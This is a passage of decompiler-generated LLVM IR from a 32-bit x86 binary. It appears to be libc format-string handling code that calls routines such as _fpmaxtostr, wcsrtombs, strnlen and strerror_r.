  %v1_80529c9 = inttoptr i32 %v0_80529d9 to i8*
  %v2_80529c9 = load i8, i8* %v1_80529c9, align 1
  %v3_80529c9 = add i8 %v2_80529c9, -48
  %v8_80529c9 = icmp eq i8 %v3_80529c9, 0
  %v9_80529c9 = icmp slt i8 %v3_80529c9, 0
  store i1 %v9_80529c9, i1* %sf.global-to-local, align 1
  store i32 1, i32* %ecx.global-to-local, align 4
  br i1 %v8_80529c9, label %dec_label_pc_80529d9, label %dec_label_pc_80529d3

dec_label_pc_80529d3:                             ; preds = %dec_label_pc_80529c9
  %v1_80529d3 = add i32 %v2_8052997, 128
  store i32 %v1_80529d3, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80529d9

dec_label_pc_80529d9:                             ; preds = %dec_label_pc_80529c5, %dec_label_pc_80529c9, %dec_label_pc_80529c0, %dec_label_pc_8052987, %dec_label_pc_80529b9, %dec_label_pc_80529d3
  %v0_8052a12 = phi i32 [ %v3_805299e, %dec_label_pc_80529c5 ], [ 1, %dec_label_pc_80529c9 ], [ %v3_805299e, %dec_label_pc_80529c0 ], [ %v3_805299e, %dec_label_pc_8052987 ], [ %v3_805299e, %dec_label_pc_80529b9 ], [ %v1_80529d3, %dec_label_pc_80529d3 ]
  %v1_80529d9 = inttoptr i32 %v0_80529d9 to i8*
  %v2_80529d9 = load i8, i8* %v1_80529d9, align 1
  %v3_80529d9 = add i8 %v2_80529d9, -48
  %v8_80529d9 = icmp eq i8 %v3_80529d9, 0
  %v9_80529d9 = icmp slt i8 %v3_80529d9, 0
  store i1 %v9_80529d9, i1* %sf.global-to-local, align 1
  %v1_80529dc = icmp eq i1 %v8_80529d9, false
  br i1 %v1_80529dc, label %dec_label_pc_8052a0a, label %dec_label_pc_80529de

dec_label_pc_80529de:                             ; preds = %dec_label_pc_80529d9
  %v0_80529de = load i32, i32* @ebp, align 4
  %v1_80529de = add i32 %v0_80529de, -6
  %v6_80529de = sub i32 5, %v0_80529de
  %v7_80529de = and i32 %v6_80529de, %v0_80529de
  %v8_80529de = icmp slt i32 %v7_80529de, 0
  %v10_80529de = icmp slt i32 %v1_80529de, 0
  store i32 11, i32* %eax.global-to-local, align 4
  %v2_80529e6 = icmp eq i1 %v10_80529de, %v8_80529de
  %v5_80529e6 = select i1 %v2_80529e6, i32 11, i32 %v0_80529de
  store i32 %v5_80529e6, i32* @ebp, align 4
  %v1_80529e9 = add i32 %v0_80529e9, 48
  %v2_80529e9 = inttoptr i32 %v1_80529e9 to i32*
  %v3_80529e9 = load i32, i32* %v2_80529e9, align 4
  %v4_80529e9 = add i32 %v3_80529e9, -1
  %v12_80529e9 = icmp eq i32 %v4_80529e9, 0
  %v13_80529e9 = icmp slt i32 %v4_80529e9, 0
  store i1 %v13_80529e9, i1* %sf.global-to-local, align 1
  %v1_80529ee = icmp eq i1 %v12_80529e9, false
  br i1 %v1_80529ee, label %dec_label_pc_80529ff, label %dec_label_pc_80529f0

dec_label_pc_80529f0:                             ; preds = %dec_label_pc_80529de
  store i32 5, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_805c0f8.489 to i32), i32* @edi, align 4
  br label %dec_label_pc_8052b89

dec_label_pc_80529ff:                             ; preds = %dec_label_pc_80529de
  %v1_80529ff = icmp eq i32 %v0_8052a12, 0
  %v2_80529ff = icmp slt i32 %v0_8052a12, 0
  store i1 %v2_80529ff, i1* %sf.global-to-local, align 1
  %v1_8052a01 = icmp eq i1 %v1_80529ff, false
  br i1 %v1_8052a01, label %dec_label_pc_8052a0a, label %dec_label_pc_8052a03

dec_label_pc_8052a03:                             ; preds = %dec_label_pc_80529ff
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8052b89

dec_label_pc_8052a0a:                             ; preds = %dec_label_pc_80529ff, %dec_label_pc_80529d9
  %v2_8052a0a = sub i32 %v0_8052a12, %v1_8052999
  %v7_8052a0a = icmp ult i32 %v0_8052a12, %v1_8052999
  %v12_8052a0a = icmp eq i32 %v2_8052a0a, 0
  %v13_8052a0a = icmp slt i32 %v2_8052a0a, 0
  store i1 %v13_8052a0a, i1* %sf.global-to-local, align 1
  %v2_8052a0c = or i1 %v7_8052a0a, %v12_8052a0a
  br i1 %v2_8052a0c, label %dec_label_pc_8052b89, label %dec_label_pc_8052a12

dec_label_pc_8052a12:                             ; preds = %dec_label_pc_8052a0a
  store i1 %v13_8052a0a, i1* %sf.global-to-local, align 1
  store i32 %v2_8052a0a, i32* @ebx, align 4
  br label %dec_label_pc_8052ba3

dec_label_pc_8052a1b:                             ; preds = %dec_label_pc_80528ae
  %v1_8052a1b = add i32 %v3_8052880, -15
  %v5_8052a1b = icmp ult i32 %v3_8052880, 15
  %v9_8052a1b = icmp eq i32 %v1_8052a1b, 0
  %v10_8052a1b = icmp slt i32 %v1_8052a1b, 0
  store i1 %v10_8052a1b, i1* %sf.global-to-local, align 1
  %v2_8052a1e = or i1 %v5_8052a1b, %v9_8052a1b
  br i1 %v2_8052a1e, label %dec_label_pc_8052a20, label %dec_label_pc_8052a65

dec_label_pc_8052a20:                             ; preds = %dec_label_pc_8052a1b
  %v1_8052a20 = add i32 %v0_8052880.lcssa, 33
  %v2_8052a20 = inttoptr i32 %v1_8052a20 to i8*
  %v3_8052a20 = load i8, i8* %v2_8052a20, align 1
  %v4_8052a20 = and i8 %v3_8052a20, 8
  %v5_8052a20 = icmp eq i8 %v4_8052a20, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8052a25 = add i32 %v0_8052880.lcssa, 344
  %v2_8052a25 = inttoptr i32 %v1_8052a25 to i32*
  %v3_8052a25 = load i32, i32* %v2_8052a25, align 4
  store i32 %v3_8052a25, i32* %edx.global-to-local, align 4
  br i1 %v5_8052a20, label %dec_label_pc_8052a32, label %dec_label_pc_8052a2e

dec_label_pc_8052a2e:                             ; preds = %dec_label_pc_8052a20
  %v1_8052a2e = inttoptr i32 %v3_8052a25 to x86_fp80*
  %v2_8052a2e = load x86_fp80, x86_fp80* %v1_8052a2e, align 4
  br label %dec_label_pc_8052a34

dec_label_pc_8052a32:                             ; preds = %dec_label_pc_8052a20
  %v1_8052a32 = inttoptr i32 %v3_8052a25 to double*
  %v2_8052a32 = load double, double* %v1_8052a32, align 4
  %v3_8052a32 = fpext double %v2_8052a32 to x86_fp80
  br label %dec_label_pc_8052a34

dec_label_pc_8052a34:                             ; preds = %dec_label_pc_8052a2e, %dec_label_pc_8052a32
  %storemerge5 = phi x86_fp80 [ %v2_8052a2e, %dec_label_pc_8052a2e ], [ %v3_8052a32, %dec_label_pc_8052a32 ]
  store x86_fp80 %storemerge5, x86_fp80* %st0.global-to-local, align 4
  %v0_8052a34 = load i32, i32* @esi, align 4
  %v2_8052a34 = add i32 %v0_8052880.lcssa, -4
  %v3_8052a34 = inttoptr i32 %v2_8052a34 to i32*
  store i32 %v0_8052a34, i32* %v3_8052a34, align 4
  %v0_8052a35 = load i32, i32* @esi, align 4
  %v2_8052a35 = add i32 %v0_8052880.lcssa, -8
  %v3_8052a35 = inttoptr i32 %v2_8052a35 to i32*
  store i32 %v0_8052a35, i32* %v3_8052a35, align 4
  %v1_8052a36 = add i32 %v0_8052880.lcssa, -12
  %v2_8052a36 = inttoptr i32 %v1_8052a36 to i32*
  store i32 134555382, i32* %v2_8052a36, align 4
  %v1_8052a3b = add i32 %v0_8052880.lcssa, 20
  store i32 %v1_8052a3b, i32* %eax.global-to-local, align 4
  %v2_8052a3f = add i32 %v0_8052880.lcssa, -16
  %v3_8052a3f = inttoptr i32 %v2_8052a3f to i32*
  store i32 %v1_8052a3b, i32* %v3_8052a3f, align 4
  %v1_8052a40 = add i32 %v0_8052880.lcssa, -28
  %v10_8052a40 = icmp slt i32 %v1_8052a40, 0
  store i1 %v10_8052a40, i1* %sf.global-to-local, align 1
  %v1_8052a43 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8052a43 = inttoptr i32 %v1_8052a40 to x86_fp80*
  store x86_fp80 %v1_8052a43, x86_fp80* %v3_8052a43, align 4
  %v1_8052a46 = add i32 %v0_8052880.lcssa, 368
  %v2_8052a46 = inttoptr i32 %v1_8052a46 to i32*
  %v3_8052a46 = load i32, i32* %v2_8052a46, align 4
  %v5_8052a46 = add i32 %v0_8052880.lcssa, -32
  %v6_8052a46 = inttoptr i32 %v5_8052a46 to i32*
  store i32 %v3_8052a46, i32* %v6_8052a46, align 4
  %v0_8052a4d = call i32 @_fpmaxtostr()
  store i32 %v0_8052a4d, i32* %eax.global-to-local, align 4
  %v0_8052a52 = load i32, i32* @esp, align 4
  %v1_8052a52 = add i32 %v0_8052a52, 32
  %v2_8052a55 = icmp slt i32 %v0_8052a4d, 0
  store i1 %v2_8052a55, i1* %sf.global-to-local, align 1
  br i1 %v2_8052a55, label %dec_label_pc_8052d03, label %dec_label_pc_8052a5d

dec_label_pc_8052a5d:                             ; preds = %dec_label_pc_8052a34
  %v1_8052a5d = inttoptr i32 %v1_8052a52 to i32*
  %v2_8052a5d = load i32, i32* %v1_8052a5d, align 4
  %v4_8052a5d = add i32 %v2_8052a5d, %v0_8052a4d
  %v15_8052a5d = icmp slt i32 %v4_8052a5d, 0
  store i1 %v15_8052a5d, i1* %sf.global-to-local, align 1
  store i32 %v4_8052a5d, i32* %v1_8052a5d, align 4
  %v0_8052cf0.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052cf0

dec_label_pc_8052a65:                             ; preds = %dec_label_pc_8052a1b
  %v1_8052a65 = add i32 %v3_8052880, -17
  %v5_8052a65 = icmp ult i32 %v3_8052880, 17
  %v9_8052a65 = icmp eq i32 %v1_8052a65, 0
  %v10_8052a65 = icmp slt i32 %v1_8052a65, 0
  store i1 %v10_8052a65, i1* %sf.global-to-local, align 1
  %v2_8052a68 = or i1 %v5_8052a65, %v9_8052a65
  br i1 %v2_8052a68, label %dec_label_pc_8052a6e, label %dec_label_pc_8052b02

dec_label_pc_8052a6e:                             ; preds = %dec_label_pc_8052a65
  %v1_8052a6e = add i32 %v0_8052880.lcssa, 332
  %v2_8052a6e = inttoptr i32 %v1_8052a6e to i32*
  store i32 0, i32* %v2_8052a6e, align 4
  %v0_8052a79 = load i32, i32* @esp, align 4
  %v1_8052a79 = add i32 %v0_8052a79, 344
  %v2_8052a79 = inttoptr i32 %v1_8052a79 to i32*
  %v3_8052a79 = load i32, i32* %v2_8052a79, align 4
  store i32 %v3_8052a79, i32* %edx.global-to-local, align 4
  %v1_8052a80 = icmp eq i1 %v9_8052a65, false
  br i1 %v1_8052a80, label %dec_label_pc_8052ad2, label %dec_label_pc_8052a82

dec_label_pc_8052a82:                             ; preds = %dec_label_pc_8052a6e
  %v1_8052a82 = inttoptr i32 %v3_8052a79 to i32*
  %v2_8052a82 = load i32, i32* %v1_8052a82, align 4
  store i32 %v2_8052a82, i32* %eax.global-to-local, align 4
  %v1_8052a84 = icmp eq i32 %v2_8052a82, 0
  %v2_8052a84 = icmp slt i32 %v2_8052a82, 0
  store i1 %v2_8052a84, i1* %sf.global-to-local, align 1
  %v2_8052a86 = add i32 %v0_8052a79, 340
  %v3_8052a86 = inttoptr i32 %v2_8052a86 to i32*
  store i32 %v2_8052a82, i32* %v3_8052a86, align 4
  br i1 %v1_8052a84, label %dec_label_pc_8052b8d, label %dec_label_pc_8052a93

dec_label_pc_8052a93:                             ; preds = %dec_label_pc_8052a82
  %v0_8052a93 = load i32, i32* @esp, align 4
  %v1_8052a93 = add i32 %v0_8052a93, 20
  %v2_8052a93 = inttoptr i32 %v1_8052a93 to i32*
  %v3_8052a93 = load i32, i32* %v2_8052a93, align 4
  %v1_8052a9a = add i32 %v0_8052a93, 340
  store i32 %v1_8052a9a, i32* %ecx.global-to-local, align 4
  %v2_8052aa1 = icmp slt i32 %v3_8052a93, 0
  store i1 %v2_8052aa1, i1* %sf.global-to-local, align 1
  %v1_8052aa3 = icmp eq i1 %v2_8052aa1, false
  %v4_8052aa3 = select i1 %v1_8052aa3, i32 %v3_8052a93, i32 -1
  store i32 %v4_8052aa3, i32* %edx.global-to-local, align 4
  %v1_8052aa6 = add i32 %v0_8052a93, 332
  store i32 %v1_8052aa6, i32* %eax.global-to-local, align 4
  %v2_8052aad = add i32 %v0_8052a93, -4
  %v3_8052aad = inttoptr i32 %v2_8052aad to i32*
  store i32 %v1_8052aa6, i32* %v3_8052aad, align 4
  %v0_8052aae = load i32, i32* %edx.global-to-local, align 4
  %v2_8052aae = add i32 %v0_8052a93, -8
  %v3_8052aae = inttoptr i32 %v2_8052aae to i32*
  store i32 %v0_8052aae, i32* %v3_8052aae, align 4
  %v0_8052aaf = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052aaf = add i32 %v0_8052a93, -12
  %v3_8052aaf = inttoptr i32 %v2_8052aaf to i32*
  store i32 %v0_8052aaf, i32* %v3_8052aaf, align 4
  %v0_8052ab0 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052ab0 = add i32 %v0_8052a93, -16
  %v3_8052ab0 = inttoptr i32 %v2_8052ab0 to i32*
  store i32 %v0_8052ab0, i32* %v3_8052ab0, align 4
  %v0_8052ab1 = call i32 @__GI_wcsrtombs()
  store i32 %v0_8052ab1, i32* %eax.global-to-local, align 4
  %v0_8052ab6 = load i32, i32* @esp, align 4
  %v1_8052ab6 = add i32 %v0_8052ab6, 16
  %v1_8052ab9 = add i32 %v0_8052ab1, 1
  %v10_8052ab9 = icmp eq i32 %v1_8052ab9, 0
  %v11_8052ab9 = icmp slt i32 %v1_8052ab9, 0
  store i1 %v11_8052ab9, i1* %sf.global-to-local, align 1
  store i32 %v0_8052ab1, i32* @esi, align 4
  br i1 %v10_8052ab9, label %dec_label_pc_8052d03, label %dec_label_pc_8052ac4

dec_label_pc_8052ac4:                             ; preds = %dec_label_pc_8052a93
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8052b9e

dec_label_pc_8052ad2:                             ; preds = %dec_label_pc_8052a6e
  %v0_8052ad2 = load i32, i32* @ebx, align 4
  %v2_8052ad2 = add i32 %v0_8052a79, -4
  %v3_8052ad2 = inttoptr i32 %v2_8052ad2 to i32*
  store i32 %v0_8052ad2, i32* %v3_8052ad2, align 4
  %v1_8052ad3 = add i32 %v0_8052a79, 332
  store i32 %v1_8052ad3, i32* %eax.global-to-local, align 4
  %v2_8052ada = add i32 %v0_8052a79, -8
  %v3_8052ada = inttoptr i32 %v2_8052ada to i32*
  store i32 %v1_8052ad3, i32* %v3_8052ada, align 4
  %v0_8052adb = load i32, i32* %edx.global-to-local, align 4
  %v1_8052adb = inttoptr i32 %v0_8052adb to i32*
  %v2_8052adb = load i32, i32* %v1_8052adb, align 4
  %v4_8052adb = add i32 %v0_8052a79, -12
  %v5_8052adb = inttoptr i32 %v4_8052adb to i32*
  store i32 %v2_8052adb, i32* %v5_8052adb, align 4
  %v1_8052add = add i32 %v0_8052a79, 204
  store i32 %v1_8052add, i32* @edi, align 4
  %v2_8052ae4 = add i32 %v0_8052a79, -16
  %v3_8052ae4 = inttoptr i32 %v2_8052ae4 to i32*
  store i32 %v1_8052add, i32* %v3_8052ae4, align 4
  %v0_8052ae5 = call i32 @__GI_wcrtomb()
  store i32 %v0_8052ae5, i32* %eax.global-to-local, align 4
  %v0_8052aea = load i32, i32* @esp, align 4
  %v1_8052aea = add i32 %v0_8052aea, 16
  %v1_8052aed = add i32 %v0_8052ae5, 1
  %v10_8052aed = icmp eq i32 %v1_8052aed, 0
  %v11_8052aed = icmp slt i32 %v1_8052aed, 0
  store i1 %v11_8052aed, i1* %sf.global-to-local, align 1
  store i32 %v0_8052ae5, i32* @esi, align 4
  br i1 %v10_8052aed, label %dec_label_pc_8052d03, label %dec_label_pc_8052af8

dec_label_pc_8052af8:                             ; preds = %dec_label_pc_8052ad2
  %v2_8052af8 = add i32 %v0_8052ae5, 220
  %v3_8052af8 = add i32 %v2_8052af8, %v0_8052aea
  %v4_8052af8 = inttoptr i32 %v3_8052af8 to i8*
  store i8 0, i8* %v4_8052af8, align 1
  br label %dec_label_pc_8052b30

dec_label_pc_8052b02:                             ; preds = %dec_label_pc_8052a65
  %v1_8052b02 = add i32 %v3_8052880, -19
  %v5_8052b02 = icmp ult i32 %v3_8052880, 19
  %v9_8052b02 = icmp eq i32 %v1_8052b02, 0
  %v10_8052b02 = icmp slt i32 %v1_8052b02, 0
  store i1 %v10_8052b02, i1* %sf.global-to-local, align 1
  %v2_8052b05 = or i1 %v5_8052b02, %v9_8052b02
  br i1 %v2_8052b05, label %dec_label_pc_8052b07, label %dec_label_pc_8052b5f

dec_label_pc_8052b07:                             ; preds = %dec_label_pc_8052b02
  %v1_8052b07 = add i32 %v0_8052880.lcssa, 344
  %v2_8052b07 = inttoptr i32 %v1_8052b07 to i32*
  %v3_8052b07 = load i32, i32* %v2_8052b07, align 4
  store i32 %v3_8052b07, i32* %edx.global-to-local, align 4
  %v1_8052b0e = icmp eq i1 %v9_8052b02, false
  %v1_8052b39 = inttoptr i32 %v3_8052b07 to i32*
  %v2_8052b39 = load i32, i32* %v1_8052b39, align 4
  br i1 %v1_8052b0e, label %dec_label_pc_8052b39, label %dec_label_pc_8052b10

dec_label_pc_8052b10:                             ; preds = %dec_label_pc_8052b07
  store i32 %v2_8052b39, i32* @edi, align 4
  %v1_8052b12 = icmp eq i32 %v2_8052b39, 0
  %v2_8052b12 = icmp slt i32 %v2_8052b39, 0
  store i1 %v2_8052b12, i1* %sf.global-to-local, align 1
  br i1 %v1_8052b12, label %dec_label_pc_8052b8d, label %dec_label_pc_8052b16

dec_label_pc_8052b16:                             ; preds = %dec_label_pc_8052b10, %dec_label_pc_8052b68
  %v1_8052b1d = phi i32 [ %v0_8052880.lcssa, %dec_label_pc_8052b10 ], [ %v1_8052b82, %dec_label_pc_8052b68 ]
  %v1_8052b16 = add i32 %v1_8052b1d, 20
  %v2_8052b16 = inttoptr i32 %v1_8052b16 to i32*
  %v3_8052b16 = load i32, i32* %v2_8052b16, align 4
  store i32 %v3_8052b16, i32* %edx.global-to-local, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v2_8052b1d = add i32 %v1_8052b1d, -4
  %v3_8052b1d = inttoptr i32 %v2_8052b1d to i32*
  store i32 %v3_8052880, i32* %v3_8052b1d, align 4
  %v2_8052b1e = add i32 %v1_8052b1d, -8
  %v3_8052b1e = inttoptr i32 %v2_8052b1e to i32*
  store i32 %v3_8052880, i32* %v3_8052b1e, align 4
  %v2_8052b1f = icmp slt i32 %v3_8052b16, 0
  store i1 %v2_8052b1f, i1* %sf.global-to-local, align 1
  %v1_8052b21 = icmp eq i1 %v2_8052b1f, false
  %v2_8052b21 = load i32, i32* %eax.global-to-local, align 4
  %v4_8052b21 = select i1 %v1_8052b21, i32 %v3_8052b16, i32 %v2_8052b21
  store i32 %v4_8052b21, i32* %eax.global-to-local, align 4
  %v2_8052b24 = add i32 %v1_8052b1d, -12
  %v3_8052b24 = inttoptr i32 %v2_8052b24 to i32*
  store i32 %v4_8052b21, i32* %v3_8052b24, align 4
  %v0_8052b25 = load i32, i32* @edi, align 4
  %v2_8052b25 = add i32 %v1_8052b1d, -16
  %v3_8052b25 = inttoptr i32 %v2_8052b25 to i32*
  store i32 %v0_8052b25, i32* %v3_8052b25, align 4
  %v0_8052b26 = call i32 @strnlen()
  store i32 %v0_8052b26, i32* %eax.global-to-local, align 4
  %v0_8052b2b = load i32, i32* @esp, align 4
  %v1_8052b2b = add i32 %v0_8052b2b, 16
  %v7_8052b2b = icmp slt i32 %v1_8052b2b, 0
  store i1 %v7_8052b2b, i1* %sf.global-to-local, align 1
  store i32 %v0_8052b26, i32* @esi, align 4
  br label %dec_label_pc_8052b30

dec_label_pc_8052b30:                             ; preds = %dec_label_pc_8052af8, %dec_label_pc_8052b16
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_8052b9e

dec_label_pc_8052b39:                             ; preds = %dec_label_pc_8052b07
  store i32 %v2_8052b39, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_8052b47 = add i32 %v0_8052880.lcssa, 204
  store i32 %v1_8052b47, i32* @edi, align 4
  %v1_8052b4e = add i32 %v0_8052880.lcssa, 205
  %v2_8052b4e = inttoptr i32 %v1_8052b4e to i8*
  store i8 0, i8* %v2_8052b4e, align 1
  %v0_8052b56 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b56 = trunc i32 %v0_8052b56 to i8
  %v2_8052b56 = load i32, i32* @esp, align 4
  %v3_8052b56 = add i32 %v2_8052b56, 204
  %v4_8052b56 = inttoptr i32 %v3_8052b56 to i8*
  store i8 %v1_8052b56, i8* %v4_8052b56, align 1
  br label %dec_label_pc_8052b9e

dec_label_pc_8052b5f:                             ; preds = %dec_label_pc_8052b02
  %v1_8052b5f = add i32 %v3_8052880, -20
  %v9_8052b5f = icmp eq i32 %v1_8052b5f, 0
  %v10_8052b5f = icmp slt i32 %v1_8052b5f, 0
  store i1 %v10_8052b5f, i1* %sf.global-to-local, align 1
  %v1_8052b62 = icmp eq i1 %v9_8052b5f, false
  br i1 %v1_8052b62, label %dec_label_pc_8052d03, label %dec_label_pc_8052b68

dec_label_pc_8052b68:                             ; preds = %dec_label_pc_8052b5f
  %v0_8052b68 = load i32, i32* %stack_var_-364, align 4
  %v1_8052b68 = call i32 @__errno_location(i32 %v0_8052b68)
  store i32 %v1_8052b68, i32* %eax.global-to-local, align 4
  %v0_8052b6d = load i32, i32* %edx.global-to-local, align 4
  %v1_8052b6d = load i32, i32* @esp, align 4
  %v2_8052b6d = add i32 %v1_8052b6d, -4
  %v3_8052b6d = inttoptr i32 %v2_8052b6d to i32*
  store i32 %v0_8052b6d, i32* %v3_8052b6d, align 4
  %v1_8052b6e = add i32 %v1_8052b6d, -8
  %v2_8052b6e = inttoptr i32 %v1_8052b6e to i32*
  store i32 128, i32* %v2_8052b6e, align 4
  %v1_8052b73 = add i32 %v1_8052b6d, 204
  store i32 %v1_8052b73, i32* %edx.global-to-local, align 4
  %v2_8052b7a = add i32 %v1_8052b6d, -12
  %v3_8052b7a = inttoptr i32 %v2_8052b7a to i32*
  store i32 %v1_8052b73, i32* %v3_8052b7a, align 4
  %v1_8052b7b = inttoptr i32 %v1_8052b68 to i32*
  %v2_8052b7b = load i32, i32* %v1_8052b7b, align 4
  %v4_8052b7b = add i32 %v1_8052b6d, -16
  %v5_8052b7b = inttoptr i32 %v4_8052b7b to i32*
  store i32 %v2_8052b7b, i32* %v5_8052b7b, align 4
  %v0_8052b7d = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_8052b7d, i32* %eax.global-to-local, align 4
  %v0_8052b82 = load i32, i32* @esp, align 4
  %v1_8052b82 = add i32 %v0_8052b82, 16
  %v7_8052b82 = icmp slt i32 %v1_8052b82, 0
  store i1 %v7_8052b82, i1* %sf.global-to-local, align 1
  store i32 %v0_8052b7d, i32* @edi, align 4
  br label %dec_label_pc_8052b16

dec_label_pc_8052b89:                             ; preds = %dec_label_pc_8052a0a, %dec_label_pc_8052a03, %dec_label_pc_80529f0
  %v0_8052ba635 = phi i32 [ %v1_8052999, %dec_label_pc_8052a0a ], [ 0, %dec_label_pc_8052a03 ], [ 5, %dec_label_pc_80529f0 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052ba3

dec_label_pc_8052b8d:                             ; preds = %dec_label_pc_8052b10, %dec_label_pc_8052a82
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805c0fe.490 to i32), i32* @edi, align 4
  br label %dec_label_pc_8052b9e

dec_label_pc_8052b9e:                             ; preds = %dec_label_pc_8052b39, %dec_label_pc_8052b30, %dec_label_pc_8052ac4, %dec_label_pc_8052b8d
  %v0_8052b9e = load i32, i32* @esp, align 4
  %v1_8052b9e = add i32 %v0_8052b9e, 7
  %v2_8052b9e = inttoptr i32 %v1_8052b9e to i8*
  store i8 32, i8* %v2_8052b9e, align 1
  %v0_8052ba6.pre = load i32, i32* @esi, align 4
  %v1_8052ba6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052ba3

dec_label_pc_8052ba3:                             ; preds = %dec_label_pc_8052b89, %dec_label_pc_8052a12, %dec_label_pc_8052b9e
  %v1_8052ba6 = phi i32 [ 0, %dec_label_pc_8052b89 ], [ %v2_8052a0a, %dec_label_pc_8052a12 ], [ %v1_8052ba6.pre, %dec_label_pc_8052b9e ]
  %v0_8052ba6 = phi i32 [ %v0_8052ba635, %dec_label_pc_8052b89 ], [ %v1_8052999, %dec_label_pc_8052a12 ], [ %v0_8052ba6.pre, %dec_label_pc_8052b9e ]
  %v0_8052ba3 = load i32, i32* @ebp, align 4
  %v1_8052ba3 = add i32 %v0_8052ba3, -11
  %v9_8052ba3 = icmp eq i32 %v1_8052ba3, 0
  %v10_8052ba3 = icmp slt i32 %v1_8052ba3, 0
  store i1 %v10_8052ba3, i1* %sf.global-to-local, align 1
  %v2_8052ba6 = add i32 %v0_8052ba6, %v1_8052ba6
  store i32 %v2_8052ba6, i32* @edx, align 4
  br i1 %v9_8052ba3, label %dec_label_pc_8052bb7, label %dec_label_pc_8052bab

dec_label_pc_8052bab:                             ; preds = %dec_label_pc_8052ba3
  %v1_8052bad = add i32 %v0_8052ba3, -5
  %v6_8052bad = sub i32 4, %v0_8052ba3
  %v7_8052bad = and i32 %v6_8052bad, %v0_8052ba3
  %v8_8052bad = icmp slt i32 %v7_8052bad, 0
  %v9_8052bad = icmp eq i32 %v1_8052bad, 0
  %v10_8052bad = icmp slt i32 %v1_8052bad, 0
  store i1 %v10_8052bad, i1* %sf.global-to-local, align 1
  %v3_8052bb0 = icmp eq i1 %v10_8052bad, %v8_8052bad
  %v4_8052bb0 = icmp eq i1 %v9_8052bad, false
  %v5_8052bb0 = and i1 %v4_8052bb0, %v3_8052bb0
  %v6_8052bb0 = zext i1 %v5_8052bb0 to i32
  store i32 %v6_8052bb0, i32* %eax.global-to-local, align 4
  %v2_8052bb3 = add i32 %v2_8052ba6, 1
  %v3_8052bb3 = add i32 %v2_8052bb3, %v6_8052bb0
  store i32 %v3_8052bb3, i32* @edx, align 4
  br label %dec_label_pc_8052bb7

dec_label_pc_8052bb7:                             ; preds = %dec_label_pc_8052ba3, %dec_label_pc_8052bab
  %v0_8052bb7 = load i32, i32* @esp, align 4
  %v1_8052bb7 = add i32 %v0_8052bb7, 24
  %v2_8052bb7 = inttoptr i32 %v1_8052bb7 to i32*
  %v3_8052bb7 = load i32, i32* %v2_8052bb7, align 4
  store i32 %v3_8052bb7, i32* %eax.global-to-local, align 4
  %v1_8052bbb = add i32 %v0_8052bb7, 8
  %v2_8052bbb = inttoptr i32 %v1_8052bbb to i32*
  store i32 0, i32* %v2_8052bbb, align 4
  %v0_8052bc3 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052bc3 = load i32, i32* @edx, align 4
  %v2_8052bc3 = sub i32 %v0_8052bc3, %v1_8052bc3
  %v7_8052bc3 = icmp ult i32 %v0_8052bc3, %v1_8052bc3
  %v12_8052bc3 = icmp eq i32 %v2_8052bc3, 0
  %v13_8052bc3 = icmp slt i32 %v2_8052bc3, 0
  store i1 %v13_8052bc3, i1* %sf.global-to-local, align 1
  %v2_8052bc5 = or i1 %v7_8052bc3, %v12_8052bc3
  br i1 %v2_8052bc5, label %dec_label_pc_8052bcd, label %dec_label_pc_8052bc7

dec_label_pc_8052bc7:                             ; preds = %dec_label_pc_8052bb7
  store i1 %v13_8052bc3, i1* %sf.global-to-local, align 1
  store i32 %v2_8052bc3, i32* %eax.global-to-local, align 4
  %v1_8052bc9 = load i32, i32* @esp, align 4
  %v2_8052bc9 = add i32 %v1_8052bc9, 8
  %v3_8052bc9 = inttoptr i32 %v2_8052bc9 to i32*
  store i32 %v2_8052bc3, i32* %v3_8052bc9, align 4
  %v0_8052bd1.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052bcd

dec_label_pc_8052bcd:                             ; preds = %dec_label_pc_8052bb7, %dec_label_pc_8052bc7
  %v0_8052bd1 = phi i32 [ %v1_8052bc3, %dec_label_pc_8052bb7 ], [ %v0_8052bd1.pre, %dec_label_pc_8052bc7 ]
  %v0_8052bcd = load i32, i32* @esp, align 4
  %v1_8052bcd = add i32 %v0_8052bcd, 8
  %v2_8052bcd = inttoptr i32 %v1_8052bcd to i32*
  %v3_8052bcd = load i32, i32* %v2_8052bcd, align 4
  store i32 %v3_8052bcd, i32* @ecx, align 4
  %v2_8052bd1 = add i32 %v3_8052bcd, %v0_8052bd1
  store i32 %v2_8052bd1, i32* %eax.global-to-local, align 4
  %v1_8052bd4 = inttoptr i32 %v0_8052bcd to i32*
  %v2_8052bd4 = load i32, i32* %v1_8052bd4, align 4
  %v4_8052bd4 = add i32 %v2_8052bd4, %v2_8052bd1
  %v15_8052bd4 = icmp slt i32 %v4_8052bd4, 0
  store i1 %v15_8052bd4, i1* %sf.global-to-local, align 1
  store i32 %v4_8052bd4, i32* %v1_8052bd4, align 4
  %v0_8052bd7 = load i32, i32* @esp, align 4
  %v1_8052bd7 = add i32 %v0_8052bd7, 7
  %v2_8052bd7 = inttoptr i32 %v1_8052bd7 to i8*
